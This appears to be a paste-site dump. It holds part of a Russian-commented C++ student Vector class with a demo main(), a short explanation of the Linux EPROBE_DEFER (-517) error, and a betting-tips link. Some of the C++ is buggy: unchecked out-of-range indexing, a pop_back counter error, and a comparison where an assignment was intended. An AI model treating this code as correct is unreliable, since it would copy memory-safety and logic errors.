			for (int i = 0; i < size_; i++) {
				arr_[i] = other.arr_[i];
			}
		}
		return *this;
	}

	void push_back(const int value) {
		check_capacity();
		arr_[size_] = value;
		size_++;
		total_number_elements++;
	}

	void pop_back() {
		if (size_ > 0) {
			size_--;
		}
		total_number_elements--;
	}

	void insert(const int index, const int value) {
		if (index < 0 || index > size_) {
			cout << ""Некорректный индекс"" << endl;
			return;
		}
		check_capacity();
		for (int i = size_; i > index; i--) {
			arr_[i] = arr_[i - 1];
		}
		arr_[index] = value;
		size_++;
		total_number_elements++;
	}

	void erase(const int index) {
		if (index < 0 || index >= size_) {
			cout << ""Некорректный индекс"" << endl;
			return;
		}
		for (int i = index; i < size_ - 1; i++) {
			arr_[i] = arr_[i + 1];
		}
		size_--;
		total_number_elements--;
	}


	int& operator[](const int index) {
		if (index < 0 || index >= size_) {
			cout << ""Некорректный индекс"" << endl;
		}
		return arr_[index];
	}

	int operator[](const int index) const {
		if (index < 0 || index >= size_) {
			cout << ""Некорректный индекс"" << endl;
		}
		return arr_[index];
	}

	int size() const {
		return size_;
	}

	int capacity() const {
		return capacity_;
	}

	void print() const {
		for (int i = 0; i < size_; i++) {
			cout << arr_[i] << "" "";
		}
		cout << endl;
	}

	bool operator==(const Vector& other) const {
		if (size_ != other.size_) {
			return false;
		}
		for (int i = 0; i < size_; i++) {
			if (arr_[i] != other.arr_[i]) {
				return false;
			}
		}
		return true;
	}

	bool operator!=(const Vector& other) const {
		return !(*this == other);
	}

	static int get_total_number_elements() {
		return total_number_elements;
	}

	~Vector() {
		delete[] arr_;
		total_number_elements -= size_;
	}

private:

	void check_capacity() {
		if (size_ == capacity_) {
			int* temp = new int[capacity_ * 2];
			for (int i = 0; i < size_; i++) {
				temp[i] = arr_[i];
			}
			delete[] arr_;
			arr_ = temp;
			capacity_ *= 2;
		}
	}

	int size_; // текущее количество элементов
	int capacity_; // емкость хранилища
	int* arr_; // хранилище
	static int total_number_elements; // общее количество элементов по всем векторам
};

int Vector::total_number_elements = 0;

int main() {
	setlocale(LC_ALL, ""ru"");

	Vector vec1;

	cout << ""Общее количество элементов "" << Vector::get_total_number_elements() << endl;

	vec1.push_back(10);
	vec1.push_back(15);
	vec1.push_back(20);
	vec1.push_back(25);
	vec1.push_back(22);

	cout << ""Общее количество элементов "" << Vector::get_total_number_elements() << endl;

	vec1.print();

	vec1.pop_back();
	vec1.print();

	vec1.insert(2, 44);
	vec1.print();

	vec1.erase(2);
	vec1.print();

	vec1[0] == 33;
	cout << vec1[3] << endl;


	vec1.print();

	cout << vec1.size() << endl;
	cout << vec1.capacity() << endl;

	const Vector vec2(vec1);
	cout << vec2.size() << endl;
	cout << vec2.capacity() << endl;
	vec2.print();
	cout << vec2[3] << endl;

	cout << ""Общее количество элементов "" << Vector::get_total_number_elements() << endl;

	Vector vec3;

	vec3 = vec1;
	vec3.print();

	cout << (vec1 == vec3) << endl;
	cout << (vec1 != vec3) << endl;

	cout << ""Общее количество элементов "" << Vector::get_total_number_elements() << endl;
}
"
8tjFpa1H,Untitled,vpeter,Bash,Thursday 29th of February 2024 04:56:06 AM CDT,"The Linux error code -517 corresponds to the constant EPROBE_DEFER. Let’s delve into what this error means:

    EPROBE_DEFER (517):
        This error code is used in the Linux kernel and typically occurs during device probing.
        When a kernel module (driver) requests a probe retry, it returns this error.
        The reason for this behavior lies in the way modern operating systems load kernel modules in parallel. There is no fixed order, and modules can depend on each other.
        In your case, the HiFiBerry DAC+ driver might need functions from another module (e.g., the underlying sound driver), which hasn’t loaded yet.
        The error code 517 essentially says, “I’m waiting for some other stuff that’s not yet there; please let me try again later.”
        After some time, you’ll likely see a message indicating successful connection to the underlying sound subsystem driver1.

So, when you encounter this error, rest assured that it’s part of the normal device initialization process. The system is retrying to load the necessary components in the right order. 🛠️🐧🔍
"
XXQ1pgeX,Soccer Prediction Betting Tips 29022024,livebetpro,PHP,Thursday 29th of February 2024 04:38:33 AM CDT,https://www.livebetpro.com/soccer-prediction-betting-tips-29022024/
